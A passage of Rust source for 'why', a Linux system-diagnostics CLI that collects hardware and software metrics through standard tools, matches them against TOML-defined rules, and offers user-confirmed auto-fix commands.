use anyhow::{anyhow, Context, Result};
use chrono::{DateTime, Utc};
use clap::{Parser, Subcommand};
use colored::*;
use crossterm::{
    event::{self, Event, KeyCode},
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
    ExecutableCommand,
};
use dialoguer::{theme::ColorfulTheme, Confirm};
use lazy_static::lazy_static;
use ratatui::{
    backend::CrosstermBackend,
    layout::{Constraint, Direction, Layout},
    widgets::{Block, Borders, Paragraph, Sparkline},
    Frame, Terminal,
};
use regex::Regex;
use rusqlite::{params, Connection};
use rust_i18n::t;
use serde::Deserialize;
use std::cmp::Ordering;
use std::collections::HashSet;
use std::env;
use std::fs;
use std::io::stdout;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;
use std::time::Duration;
use sysinfo::System;

mod deps;

rust_i18n::i18n!("i18n", fallback = "en");

const RULES_REMOTE_URL: &str = "https://raw.githubusercontent.com/tu/why/main/rules.toml";
const HISTORY_DIR: &str = ".cache/why";
const HISTORY_FILE: &str = "history.db";

// Performance and threshold constants
const PERFORMANCE_TARGET_MS: u128 = 200;
const FP_PRECISION_THRESHOLD: f32 = 0.001;
const BOOT_SLOW_SERVICE_WARNING: f32 = 5.0;
const BOOT_SLOW_SERVICE_CRITICAL: f32 = 15.0;
const RCA_EVENT_LIMIT: usize = 12;

static LOG_CACHE: OnceLock<Option<String>> = OnceLock::new();

lazy_static! {
    static ref NUM_REGEX: Regex = Regex::new(r"\d+\.?\d*").unwrap();
}

#[derive(Parser)]
#[command(name = "why", about = t!("about"))]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
    #[arg(long, help = t!("update_rules_help"))]
    update_rules: bool,
    #[arg(long, help = t!("watch_help"))]
    watch: bool,
    #[arg(long, help = t!("snapshot_help"))]
    snapshot: bool,
    #[arg(long, help = t!("lang_help"), default_value = "en")]
    lang: String,
}

#[derive(Subcommand, Clone)]
enum Commands {
    All,
    Cpu,
    Mem,
    Disk,
    Battery,
    Net,
    Crash,
    Historical,
    Wifi,
    Bluetooth,
    Fan,
    Hot,
    Update,
    Boot,
    BootCritical,
    Gpu,
    Gaming,
    Slow,
    Storage,
    Security,
    Rca,
    KubeNode,
    CheckDeps,
}

#[derive(Deserialize, Clone)]
struct Rule {
    name: String,
    trigger: String,
    message: String,
    solution: String,
    severity: u8,
    auto_fix: Option<String>,
}

#[derive(Deserialize)]
struct RulesFile {
    rule: Vec<Rule>,
}

#[derive(Clone, serde::Serialize)]
struct Finding {
    severity: String,
    severity_value: u8,
    message: String,
    solution: String,
    auto_fix: Option<String>,
    rule_name: String,
}

#[derive(Debug, Clone)]
enum Condition {
    CpuGreater(f32),
    MemGreater(f32),
    TotalRamLess(u64),
    ProcessContains(String),
    ProcessCountGreater(usize),
    LogContains(Regex),
    DiskFullGreater(f32),
    SnapLoopsGreater(u32),
    FlatpakUnusedGreater(u32),
    BatteryDrainGreater(f32),
    WifiChannelCountGreater(u32),
    WifiSignalLess(f32),
    FanSpeedGreater(f32),
    TemperatureGreater(f32),
    FilesystemEquals(String),
    WaylandVsX11(String),
    DockerDanglingGreater(u32),
    PipewireLatencyGreater(f32),
    FirefoxSoftRender(bool),
    ZfsArcPercentGreater(f32),
    LuksDevicesGreater(u32),
    GpuVendorEquals(String),
    GpuTempGreater(f32),
    GpuTempLess(f32),
    GpuUtilGreater(f32),
    GpuMemUtilGreater(f32),
    PrimeOffloadEquals(String),
    GamescopeRunning(bool),
    SteamRunning(bool),
    ProtonFailures(bool),
    VulkanLoaderMissing(bool),
}

#[derive(serde::Serialize)]
struct Metrics {
    cpu_usage: f32,
    mem_usage: f32,
    total_ram_mb: u64,
    disk_full_percent: f32,
    filesystem: Option<String>,
    snap_loops: Option<u32>,
    flatpak_unused: Option<u32>,
    battery_drain_w: Option<f32>,
    wifi_channel_count: Option<u32>,
    wifi_signal_dbm: Option<f32>,
    fan_speed_rpm: Option<f32>,
    temperature_c: Option<f32>,
    wayland_vs_x11: Option<String>,
    docker_dangling: Option<u32>,
    process_names: Vec<String>,
    process_count: usize,
    pipewire_latency_ms: Option<f32>,
    firefox_soft_render: Option<bool>,
    zfs_arc_full_percent: Option<f32>,
    luks_device_count: Option<u32>,
    gpu: Option<GpuDetails>,
    prime_offload_enabled: bool,
    gamescope_running: bool,
    steam_running: bool,
    proton_failure_detected: bool,
    vulkan_loader_missing: bool,
}

#[derive(Clone, Debug)]
struct WifiNetwork {
    active: bool,
    channel: Option<u32>,
    signal: Option<f32>,
}

#[derive(Clone, Default, serde::Serialize)]
struct GpuDetails {
    vendor: String,
    model: Option<String>,
    driver: Option<String>,
    temperature: Option<f32>,
    utilization: Option<f32>,
    memory_total_mb: Option<f32>,
    memory_used_mb: Option<f32>,
    fan_speed_percent: Option<f32>,
}

#[derive(serde::Serialize)]
struct SnapshotData {
    timestamp: String,
    hostname: String,
    kernel: String,
    distro: String,
    uptime_seconds: u64,
    metrics: Metrics,
    findings: Vec<Finding>,
    recent_dmesg: Option<Vec<String>>,
    recent_journal: Option<Vec<String>>,
}

impl GpuDetails {
    fn memory_utilization(&self) -> Option<f32> {
        match (self.memory_used_mb, self.memory_total_mb) {
            // Use 0.001 threshold to avoid floating-point precision issues
            (Some(used), Some(total)) if total > FP_PRECISION_THRESHOLD => {
                Some((used / total) * 100.0)
            }
            _ => None,
        }
    }
}

/// Helper to run a command with C locale (for parsing numbers with . instead of ,)
/// Critical for systems in PT/DE/FR where decimals use comma
fn run_cmd_c_locale(cmd: &str, args: &[&str]) -> Option<String> {
    Command::new(cmd)
        .args(args)
        .env("LC_ALL", "C") // Force C locale to get . instead of , for decimals
        .env("LANG", "C")
        .output()
        .ok()
        .filter(|out| out.status.success())
        .map(|out| String::from_utf8_lossy(&out.stdout).to_string())
}

/// Helper to run a command and check if it succeeded
fn run_cmd_status(cmd: &str, args: &[&str]) -> bool {
    Command::new(cmd)
        .args(args)
        .status()
        .map(|status| status.success())
        .unwrap_or(false)
}

fn main() -> Result<()> {
    let start_time = std::time::Instant::now();
    let cli = Cli::parse();
    rust_i18n::set_locale(&cli.lang);

    if cli.watch {
        return tui_mode();
    }

    let mut sys = System::new_all();
    sys.refresh_all();

    if cli.update_rules {
        update_rules_from_remote()?;
    }

    let rules = load_rules()?;
    let parsed_rules: Vec<(Vec<Condition>, Rule)> = rules
        .iter()
        .map(|rule| (parse_trigger(&rule.trigger), rule.clone()))
        .collect();

    let command = cli.command.unwrap_or(Commands::All);

    // Collect GPU for snapshot (complete system state) or GPU-relevant commands
    let needs_gpu =
        cli.snapshot || matches!(command, Commands::All | Commands::Gpu | Commands::Gaming);
    let mut metrics = Metrics::gather(&sys);
    if needs_gpu {
        metrics = metrics.with_gpu();
    }

    let mut findings = evaluate_rules(&metrics, &parsed_rules);

    correlate_findings(&mut findings);

    // Filter gaming rules unless explicitly running 'why gaming'
    if !matches!(command, Commands::Gaming) {
        findings.retain(|f| !f.rule_name.starts_with("gaming_"));
    }

    log_to_history(&findings)?;

    // Handle snapshot mode (early return)
    if cli.snapshot {
        return generate_snapshot(&metrics, &findings);
    }

    match command {
        Commands::All => show_dashboard(&findings, &metrics),
        Commands::Cpu => filter_show("CPU", &findings),
        Commands::Mem => filter_show("RAM", &findings),
        Commands::Disk => filter_show("Disk", &findings),
        Commands::Battery => filter_show("Battery", &findings),
        Commands::Net => filter_show("Net", &findings),
        Commands::Crash => show_crashes()?,
        Commands::Historical => show_historical()?,
        Commands::Wifi => why_wifi()?,
        Commands::Bluetooth => why_bluetooth()?,
        Commands::Fan => why_fan(&sys, &metrics)?,
        Commands::Hot => why_hot(&metrics)?,
        Commands::Update => why_update()?,
        Commands::Boot => why_boot()?,
        Commands::BootCritical => why_boot_critical()?,
        Commands::Gpu => why_gpu(&metrics)?,
        Commands::Gaming => why_gaming(&metrics)?,
        Commands::Slow => why_slow(&sys, &metrics, &findings)?,
        Commands::Storage => why_storage(&metrics)?,
        Commands::Security => why_security()?,
        Commands::Rca => why_rca(&metrics)?,
        Commands::KubeNode => why_kube_node()?,
        Commands::CheckDeps => deps::check_deps()?,
    }

    for finding in findings.iter().take(3) {
        if let Some(cmd) = &finding.auto_fix {
            if !is_safe_auto_fix(cmd) {
                continue;
            }

            if Confirm::with_theme(&ColorfulTheme::default())
                .with_prompt(t!("apply_fix_prompt", message = finding.message.clone()))
                .default(false)
                .interact()?
            {
                println!("{}", t!("running_fix").replace("{cmd}", cmd).green());
                Command::new("sh")
                    .arg("-c")
                    .arg(cmd)
                    .status()
                    .context(t!("fix_failed"))?;
            }
        }
    }

    // Performance tracking: Log execution time if WHY_BENCHMARK=1 or RUST_LOG=debug
    let elapsed = start_time.elapsed();
    if env::var("WHY_BENCHMARK").is_ok()
        || env::var("RUST_LOG").unwrap_or_default().contains("debug")
    {
        eprintln!("⏱️  Execution time: {:.0}ms", elapsed.as_millis());
        if elapsed.as_millis() > PERFORMANCE_TARGET_MS {
            eprintln!(
                "⚠️  Warning: Exceeded {}ms target ({:.0}ms)",
                PERFORMANCE_TARGET_MS,
                elapsed.as_millis()
            );
        }
    }

    Ok(())
}

fn update_rules_from_remote() -> Result<()> {
    use std::time::Duration;

    // Create HTTP client with 10-second timeout
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .context("Failed to create HTTP client")?;

    let response = client
        .get(RULES_REMOTE_URL)
        .send()
        .context("Failed to download remote rules")?
        .error_for_status()
        .context("Remote rules endpoint returned error")?;
    let contents = response.text().context("Failed to read remote rules")?;

    // Validate TOML structure before writing
    let parsed: RulesFile =
        toml::from_str(&contents).context("Remote rules file is invalid TOML")?;

    if parsed.rule.is_empty() {
        return Err(anyhow!("Remote rules file contains no rules"));
    }

    // Validate all auto_fix commands for safety
    for rule in &parsed.rule {
        if let Some(ref cmd) = rule.auto_fix {
            if !is_safe_auto_fix(cmd) {
                return Err(anyhow!(
                    "Remote rules contain unsafe auto_fix command in rule '{}': {}",
                    rule.name,
                    cmd
                ));
            }
        }
    }

    fs::write(Path::new(RULES_PATH), &contents).context("Unable to write rules file")?;
    println!("{}", t!("rules_updated").to_string().green());
    Ok(())
}

fn load_rules() -> Result<Vec<Rule>> {
    let data = fs::read_to_string("rules.toml").context("Unable to read rules.toml")?;
    let parsed: RulesFile =
        toml::from_str(&data).context("rules.toml is invalid – check syntax")?;
    if parsed.rule.is_empty() {
        return Err(anyhow!("No rules found"));
    }
    Ok(parsed.rule)
}

fn parse_trigger(trigger: &str) -> Vec<Condition> {
    trigger
        .split("&&")
        .filter_map(|token| parse_condition(token.trim()))
        .collect()
}

fn parse_condition(token: &str) -> Option<Condition> {
    if token.is_empty() {
        return None;
    }
    if let Some(value) = token.strip_prefix("cpu>") {
        return value.trim().parse().ok().map(Condition::CpuGreater);
    }
    if let Some(value) = token.strip_prefix("mem>") {
        return value.trim().parse().ok().map(Condition::MemGreater);
    }
    if let Some(value) = token.strip_prefix("total_ram<") {
        return value.trim().parse().ok().map(Condition::TotalRamLess);
    }
    if let Some(process) = token.strip_prefix("process=") {
        return Some(Condition::ProcessContains(process.trim().to_string()));
    }
    if let Some(value) = token.strip_prefix("process_count>") {
        return value
            .trim()
            .parse()
            .ok()
            .map(Condition::ProcessCountGreater);
    }
    if let Some(value) = token.strip_prefix("log_contains=") {
        return Regex::new(value.trim()).ok().map(Condition::LogContains);
    }
    if let Some(value) = token.strip_prefix("disk_full>") {
        return value.trim().parse().ok().map(Condition::DiskFullGreater);
    }
    if let Some(value) = token.strip_prefix("snap loops>") {
        return value.trim().parse().ok().map(Condition::SnapLoopsGreater);
    }
    if let Some(value) = token.strip_prefix("flatpak_unused>") {
        return value
            .trim()
            .parse()
            .ok()
            .map(Condition::FlatpakUnusedGreater);
    }
    if let Some(value) = token.strip_prefix("battery_drain>") {
        return value
            .trim()
            .parse()
            .ok()
            .map(Condition::BatteryDrainGreater);
    }
    if let Some(value) = token.strip_prefix("wifi_channel_count>") {
        return value
            .trim()
            .parse()
            .ok()
            .map(Condition::WifiChannelCountGreater);
    }
    if let Some(value) = token.strip_prefix("wifi_signal<") {
        return value.trim().parse().ok().map(Condition::WifiSignalLess);
    }
    if let Some(value) = token.strip_prefix("fan_speed>") {
        return value.trim().parse().ok().map(Condition::FanSpeedGreater);
    }
    if let Some(value) = token.strip_prefix("temp>") {
        return value.trim().parse().ok().map(Condition::TemperatureGreater);
    }
    if let Some(value) = token.strip_prefix("filesystem=") {
        return Some(Condition::FilesystemEquals(value.trim().to_string()));
    }
    if let Some(value) = token.strip_prefix("wayland_vs_x11=") {
        return Some(Condition::WaylandVsX11(value.trim().to_string()));
    }
    if let Some(value) = token.strip_prefix("docker_dangling>") {
        return value
            .trim()
            .parse()
            .ok()
            .map(Condition::DockerDanglingGreater);
    }
    if let Some(value) = token.strip_prefix("pipewire_latency>") {
        return value
            .trim()
            .parse()
            .ok()
            .map(Condition::PipewireLatencyGreater);
    }
    if let Some(value) = token.strip_prefix("firefox_soft_render=") {
        return parse_bool_token(value).map(Condition::FirefoxSoftRender);
    }
    if let Some(value) = token.strip_prefix("zfs_arc_full>") {
        return value
            .trim()
            .parse()
            .ok()
            .map(Condition::ZfsArcPercentGreater);
    }
    if let Some(value) = token.strip_prefix("luks_devices>") {
        return value.trim().parse().ok().map(Condition::LuksDevicesGreater);
    }
    if let Some(value) = token.strip_prefix("gpu_vendor=") {
        return Some(Condition::GpuVendorEquals(
            value.trim().to_ascii_lowercase(),
        ));
    }
    if let Some(value) = token.strip_prefix("gpu_temp>") {
        return value.trim().parse().ok().map(Condition::GpuTempGreater);
    }
    if let Some(value) = token.strip_prefix("gpu_temp<") {
        return value.trim().parse().ok().map(Condition::GpuTempLess);
    }
    if let Some(value) = token.strip_prefix("gpu_util>") {
        return value.trim().parse().ok().map(Condition::GpuUtilGreater);
    }
    if let Some(value) = token.strip_prefix("gpu_mem_util>") {
        return value.trim().parse().ok().map(Condition::GpuMemUtilGreater);
    }
    if let Some(value) = token.strip_prefix("prime_offload=") {
        return Some(Condition::PrimeOffloadEquals(
            value.trim().to_ascii_lowercase(),
        ));
    }
    if let Some(value) = token.strip_prefix("gamescope_running=") {
        return parse_bool_token(value).map(Condition::GamescopeRunning);
    }
    if let Some(value) = token.strip_prefix("steam_running=") {
        return parse_bool_token(value).map(Condition::SteamRunning);
    }
    if let Some(value) = token.strip_prefix("proton_failures=") {
        return parse_bool_token(value).map(Condition::ProtonFailures);
    }
    if let Some(value) = token.strip_prefix("vulkan_loader_missing=") {
        return parse_bool_token(value).map(Condition::VulkanLoaderMissing);
    }

    eprintln!("Unknown condition in rule trigger: {token}");
    None
}

fn parse_bool_token(value: &str) -> Option<bool> {
    match value.trim().to_ascii_lowercase().as_str() {
        "true" | "1" | "yes" => Some(true),
        "false" | "0" | "no" => Some(false),
        _ => None,
    }
}

fn evaluate_rules(metrics: &Metrics, parsed_rules: &[(Vec<Condition>, Rule)]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let logs = recent_logs();

    'rule_loop: for (conditions, rule) in parsed_rules {
        for condition in conditions {
            if !condition_holds(condition, metrics, logs.as_deref()) {
                continue 'rule_loop;
            }
        }

        findings.push(Finding {
            severity: format!("{} {}", severity_emoji(rule.severity), rule.severity),
            severity_value: rule.severity,
            message: rule.message.clone(),
            solution: rule.solution.clone(),
            auto_fix: rule.auto_fix.clone(),
            rule_name: rule.name.clone(),
        });
    }

    findings.sort_by(|a, b| b.severity_value.cmp(&a.severity_value));
    findings
}

fn severity_emoji(severity: u8) -> &'static str {
    match severity {
        0..=4 => "ℹ️",
        5..=7 => "⚠️",
        _ => "🔥",
    }
}

fn condition_holds(condition: &Condition, metrics: &Metrics, logs: Option<&str>) -> bool {
    match condition {
        Condition::CpuGreater(value) => metrics.cpu_usage > *value,
        Condition::MemGreater(value) => metrics.mem_usage > *value,
        Condition::TotalRamLess(value) => metrics.total_ram_mb < *value,
        Condition::ProcessContains(name) => {
            let needle = name.to_ascii_lowercase();
            metrics
                .process_names
                .iter()
                .any(|proc_name| proc_name.contains(&needle))
        }
        Condition::ProcessCountGreater(value) => metrics.process_count > *value,
        Condition::LogContains(regex) => logs.map(|log| regex.is_match(log)).unwrap_or(false),
        Condition::DiskFullGreater(value) => metrics.disk_full_percent > *value,
        Condition::SnapLoopsGreater(value) => metrics
            .snap_loops
            .map(|loops| loops > *value)
            .unwrap_or(false),
        Condition::FlatpakUnusedGreater(value) => metrics
            .flatpak_unused
            .map(|unused| unused > *value)
            .unwrap_or(false),
        Condition::BatteryDrainGreater(value) => metrics
            .battery_drain_w
            .map(|drain| drain > *value)
            .unwrap_or(false),
        Condition::WifiChannelCountGreater(value) => metrics
            .wifi_channel_count
            .map(|count| count > *value)
            .unwrap_or(false),
        Condition::WifiSignalLess(value) => metrics
            .wifi_signal_dbm
            .map(|signal| signal < *value)
            .unwrap_or(false),
        Condition::FanSpeedGreater(value) => metrics
            .fan_speed_rpm
            .map(|speed| speed > *value)
            .unwrap_or(false),
        Condition::TemperatureGreater(value) => metrics
            .temperature_c
            .map(|temp| temp > *value)
            .unwrap_or(false),
        Condition::FilesystemEquals(fs) => metrics
            .filesystem
            .as_ref()
            .map(|filesystem| filesystem == fs)
            .unwrap_or(false),
        Condition::WaylandVsX11(target) => metrics
            .wayland_vs_x11
            .as_ref()
            .map(|session| session == target)
            .unwrap_or(false),
        Condition::DockerDanglingGreater(value) => metrics
            .docker_dangling
            .map(|count| count > *value)
            .unwrap_or(false),
        Condition::PipewireLatencyGreater(value) => metrics
            .pipewire_latency_ms
            .map(|latency| latency > *value)
            .unwrap_or(false),
        Condition::FirefoxSoftRender(expected) => metrics
            .firefox_soft_render
            .map(|state| state == *expected)
            .unwrap_or(false),
        Condition::ZfsArcPercentGreater(value) => metrics
            .zfs_arc_full_percent
            .map(|arc| arc > *value)
            .unwrap_or(false),
        Condition::LuksDevicesGreater(value) => metrics
            .luks_device_count
            .map(|count| count > *value)
            .unwrap_or(false),
        Condition::GpuVendorEquals(target) => metrics
            .gpu
            .as_ref()
            .map(|gpu| gpu.vendor.eq_ignore_ascii_case(target))
            .unwrap_or(false),
        Condition::GpuTempGreater(value) => metrics
            .gpu
            .as_ref()
            .and_then(|gpu| gpu.temperature)
            .map(|temp| temp > *value)
            .unwrap_or(false),
        Condition::GpuTempLess(value) => metrics
            .gpu
            .as_ref()
            .and_then(|gpu| gpu.temperature)
            .map(|temp| temp < *value)
            .unwrap_or(false),
        Condition::GpuUtilGreater(value) => metrics
            .gpu
            .as_ref()
            .and_then(|gpu| gpu.utilization)
            .map(|util| util > *value)
            .unwrap_or(false),
        Condition::GpuMemUtilGreater(value) => metrics
            .gpu
            .as_ref()
            .and_then(|gpu| gpu.memory_utilization())
            .map(|util| util > *value)
            .unwrap_or(false),
        Condition::PrimeOffloadEquals(expected) => {
            let actual = if metrics.prime_offload_enabled {
                "enabled"
            } else {
                "disabled"
            };
            actual.eq_ignore_ascii_case(expected)
        }
        Condition::GamescopeRunning(expected) => metrics.gamescope_running == *expected,
        Condition::SteamRunning(expected) => metrics.steam_running == *expected,
        Condition::ProtonFailures(expected) => metrics.proton_failure_detected == *expected,
        Condition::VulkanLoaderMissing(expected) => metrics.vulkan_loader_missing == *expected,
    }
}

impl Metrics {
    fn gather(sys: &System) -> Self {
        let wifi_data = wifi_networks();
        Metrics {
            cpu_usage: sys.global_cpu_info().cpu_usage(),
            mem_usage: memory_percent(sys),
            total_ram_mb: sys.total_memory() / 1024,
            disk_full_percent: disk_usage_percent(),
            filesystem: root_filesystem(),
            snap_loops: count_snap_loops(),
            flatpak_unused: count_flatpak_unused(),
            battery_drain_w: read_battery_drain(),
            wifi_channel_count: wifi_data.as_ref().map(|nets| nets.len() as u32),
            wifi_signal_dbm: wifi_data.as_ref().and_then(|nets| {
                nets.iter()
                    .find(|net| net.active)
                    .or_else(|| {
                        nets.iter().max_by(|a, b| match (a.signal, b.signal) {
                            (Some(lhs), Some(rhs)) => {
                                lhs.partial_cmp(&rhs).unwrap_or(Ordering::Equal)
                            }
                            (Some(_), None) => Ordering::Greater,
                            (None, Some(_)) => Ordering::Less,
                            (None, None) => Ordering::Equal,
                        })
                    })
                    .and_then(|net| net.signal)
            }),
            fan_speed_rpm: read_max_fan_speed(),
            temperature_c: read_max_temperature(),
            wayland_vs_x11: current_session_type(),
            docker_dangling: count_dangling_images(),
            process_names: sys
                .processes()
                .values()
                .map(|proc| proc.name().to_ascii_lowercase())
                .collect(),
            process_count: sys.processes().len(),
            pipewire_latency_ms: detect_pipewire_latency_ms(),
            firefox_soft_render: detect_firefox_soft_render(),
            zfs_arc_full_percent: read_zfs_arc_percent(),
            luks_device_count: count_luks_devices(),
            gpu: None, // GPU detection moved out of gather() to avoid hammering in watch mode
            prime_offload_enabled: detect_prime_offload_enabled(),
            gamescope_running: is_process_running("gamescope"),
            steam_running: is_process_running("steam") || is_process_running("steamwebhelper"),
            proton_failure_detected: detect_proton_failures(),
            vulkan_loader_missing: detect_vulkan_loader_missing(),
        }
    }

    fn with_gpu(mut self) -> Self {
        self.gpu = detect_gpu_info();
        self
    }
}

fn memory_percent(sys: &System) -> f32 {
    let total = sys.total_memory() as f32;
    if total == 0.0 {
        return 0.0;
    }
    let used = sys.used_memory() as f32;
    (used / total) * 100.0
}

fn disk_usage_percent() -> f32 {
    run_cmd_c_locale("df", &["-P", "/"])
        .and_then(|text| {
            text.lines()
                .nth(1)
                .and_then(|line| line.split_whitespace().nth(4))
                .and_then(|percent| percent.trim_end_matches('%').parse::<f32>().ok())
        })
        .unwrap_or(0.0)
}

fn root_filesystem() -> Option<String> {
    if let Ok(mounts) = fs::read_to_string("/proc/mounts") {
        for line in mounts.lines() {
            let mut parts = line.split_whitespace();
            let _device = match parts.next() {
                Some(value) => value,
                None => continue,
            };
            let mount_point = match parts.next() {
                Some(value) => value,
                None => continue,
            };
            let fs_type = match parts.next() {
                Some(value) => value,
                None => continue,
            };
            if mount_point == "/" {
                return Some(fs_type.to_string());
            }
        }
    }
    let linux = Command::new("stat").args(["-f", "-c", "%T", "/"]).output();
    if let Ok(output) = linux {
        if output.status.success() {
            let fs_type = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !fs_type.is_empty() {
                return Some(fs_type);
            }
        }
    }
    let mac = Command::new("stat").args(["-f", "%T", "/"]).output().ok()?;
    if !mac.status.success() {
        return None;
    }
    let fs_type = String::from_utf8_lossy(&mac.stdout).trim().to_string();
    if fs_type.is_empty() {
        None
    } else {
        Some(fs_type)
    }
}

fn read_total_network_received() -> Option<u64> {
    if let Ok(devices) = fs::read_to_string("/proc/net/dev") {
        let mut total = 0u64;
        for line in devices.lines().skip(2) {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() > 1 {
                if let Ok(value) = parts[1].parse::<u64>() {
                    total = total.saturating_add(value);
                }
            }
        }
        return Some(total);
    }

    let output = Command::new("netstat").args(["-ib"]).output().ok()?;
    if !output.status.success() {
        return None;
    }
    let mut total = 0u64;
    for line in String::from_utf8_lossy(&output.stdout).lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() <= 6 {
            continue;
        }
        if let Ok(value) = parts[6].parse::<u64>() {
            total = total.saturating_add(value);
        }
    }
    Some(total)
}

fn count_snap_loops() -> Option<u32> {
    let mounts = fs::read_to_string("/proc/mounts").ok()?;
    let count = mounts
        .lines()
        .filter(|line| line.contains("/snap/"))
        .count();
    Some(count as u32)
}

fn count_flatpak_unused() -> Option<u32> {
    let output = Command::new("flatpak")
        .args(["list", "--app", "--columns=application,installation"])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout);
    Some(text.lines().count() as u32)
}

fn read_battery_drain() -> Option<f32> {
    let path = Command::new("sh")
        .arg("-c")
        .arg("upower -e | grep -m1 -E 'BAT|battery'")
        .output()
        .ok()?;
    if !path.status.success() {
        return None;
    }
    let battery = String::from_utf8_lossy(&path.stdout).trim().to_string();
    if battery.is_empty() {
        return None;
    }
    let info = Command::new("upower")
        .args(["-i", &battery])
        .env("LC_ALL", "C") // Force C locale for consistent number format
        .env("LANG", "C")
        .output()
        .ok()?;
    if !info.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&info.stdout);
    for line in text.lines() {
        if let Some(value) = line.trim().strip_prefix("energy-rate:") {
            let watts = value
                .split_whitespace()
                .next()
                .and_then(|n| n.parse::<f32>().ok());
            if watts.is_some() {
                return watts;
            }
        }
    }
    None
}

fn wifi_networks() -> Option<Vec<WifiNetwork>> {
    let output = Command::new("nmcli")
        .args(["-t", "-f", "ACTIVE,CHAN,SIGNAL", "device", "wifi", "list"])
        .env("LC_ALL", "C") // Force C locale for consistent number format
        .env("LANG", "C")
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let mut nets = Vec::new();
    for line in String::from_utf8_lossy(&output.stdout).lines() {
        let mut parts = line.split(':');
        let active = parts.next().unwrap_or("") == "yes";
        let chan = parts.next().and_then(|value| value.parse::<u32>().ok());
        let signal = parts
            .next()
            .and_then(|value| value.parse::<f32>().ok())
            .map(|v| v - 100.0);
        nets.push(WifiNetwork {
            active,
            channel: chan,
            signal,
        });
    }
    if nets.is_empty() {
        None
    } else {
        Some(nets)
    }
}

fn read_max_fan_speed() -> Option<f32> {
    lazy_static! {
        static ref FAN_RE: Regex = Regex::new(r"(?i)fan\d+:?\s+([0-9]+)\s*RPM").unwrap();
    }
    run_cmd_c_locale("sensors", &[])?
        .lines()
        .filter_map(|line| {
            FAN_RE
                .captures(line)
                .and_then(|cap| cap.get(1))
                .and_then(|m| m.as_str().parse::<f32>().ok())
        })
        .max_by(|a, b| a.partial_cmp(b).unwrap_or(Ordering::Equal))
}

fn read_max_temperature() -> Option<f32> {
    lazy_static! {
        static ref TEMP_RE: Regex = Regex::new(r"([+-]?[0-9]+(\.[0-9]+)?)°C").unwrap();
    }
    run_cmd_c_locale("sensors", &[])?
        .lines()
        .filter_map(|line| {
            TEMP_RE
                .captures(line)
                .and_then(|cap| cap.get(1))
                .and_then(|m| m.as_str().parse::<f32>().ok())
        })
        .max_by(|a, b| a.partial_cmp(b).unwrap_or(Ordering::Equal))
}

fn current_session_type() -> Option<String> {
    env::var("XDG_SESSION_TYPE")
        .ok()
        .or_else(|| {
            if env::var("WAYLAND_DISPLAY").is_ok() {
                Some("wayland".to_string())
            } else if env::var("DISPLAY").is_ok() {
                Some("x11".to_string())
            } else {
                None
            }
        })
        .map(|s| s.to_ascii_lowercase())
}

fn count_dangling_images() -> Option<u32> {
    let output = Command::new("docker")
        .args(["image", "ls", "-f", "dangling=true", "-q"])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let count = String::from_utf8_lossy(&output.stdout)
        .lines()
        .filter(|line| !line.trim().is_empty())
        .count();
    Some(count as u32)
}

fn detect_pipewire_latency_ms() -> Option<f32> {
    for key in ["clock.force-quantum", "clock.allowed-quantum"] {
        if let Some(value) = read_pipewire_latency(key) {
            return Some(value);
        }
    }
    None
}

fn read_pipewire_latency(key: &str) -> Option<f32> {
    let output = Command::new("pw-metadata")
        .args(["-n", "settings", "0", key])
        .env("LC_ALL", "C") // Force C locale for consistent number format
        .env("LANG", "C")
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout);
    let values: Vec<f32> = NUM_REGEX
        .find_iter(&text)
        .filter_map(|m| m.as_str().parse::<f32>().ok())
        .collect();
    if text.contains('/') && values.len() >= 2 {
        let frames = values[0];
        let rate = values[1];
        if rate > 0.0 {
            return Some((frames / rate) * 1000.0);
        }
    }
    values.first().copied()
}

fn detect_firefox_soft_render() -> Option<bool> {
    let output = Command::new("glxinfo").arg("-B").output().ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout);
    for line in text.lines() {
        if line.to_ascii_lowercase().contains("opengl renderer string") {
            let renderer = line.split(':').nth(1)?.trim().to_ascii_lowercase();
            let soft = renderer.contains("llvmpipe")
                || renderer.contains("software")
                || renderer.contains("softpipe");
            return Some(soft);
        }
    }
    None
}

fn read_zfs_arc_percent() -> Option<f32> {
    let data = fs::read_to_string("/proc/spl/kstat/zfs/arcstats").ok()?;
    let mut size = None;
    let mut c = None;
    for line in data.lines() {
        let mut parts = line.split_whitespace();
        let key = parts.next()?;
        let value = parts.last()?.parse::<f64>().ok()?;
        match key {
            "size" => size = Some(value),
            "c" => c = Some(value),
            _ => {}
        }
    }
    match (size, c) {
        (Some(size), Some(c)) if c > 0.0 => Some(((size / c) * 100.0) as f32),
        _ => None,
    }
}

fn count_luks_devices() -> Option<u32> {
    let output = Command::new("lsblk")
        .args(["-ln", "-o", "TYPE"])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let count = String::from_utf8_lossy(&output.stdout)
        .lines()
        .filter(|line| line.trim() == "crypt")
        .count();
    Some(count as u32)
}

fn detect_prime_offload_enabled() -> bool {
    is_command_available("prime-run") || env::var("NV_PRIME_RENDER_OFFLOAD").is_ok()
}

fn is_process_running(name: &str) -> bool {
    run_cmd_status("pgrep", &["-x", name])
}

fn detect_proton_failures() -> bool {
    // user_home_dir() returns trusted path from $HOME/$USERPROFILE env vars
    // No additional validation needed - it's always safe and absolute
    let home = match user_home_dir() {
        Some(path) => path,
        None => return false,
    };

    let paths = vec![
        home.join(".steam/steam/logs/compat_log.txt"),
        home.join(".local/share/Steam/logs/compat_log.txt"),
    ];
    for path in paths {
        if let Ok(content) = fs::read_to_string(&path) {
            if content
                .lines()
                .rev()
                .take(200)
                .any(|line| line.contains("ERROR") || line.to_ascii_lowercase().contains("crash"))
            {
                return true;
            }
        }
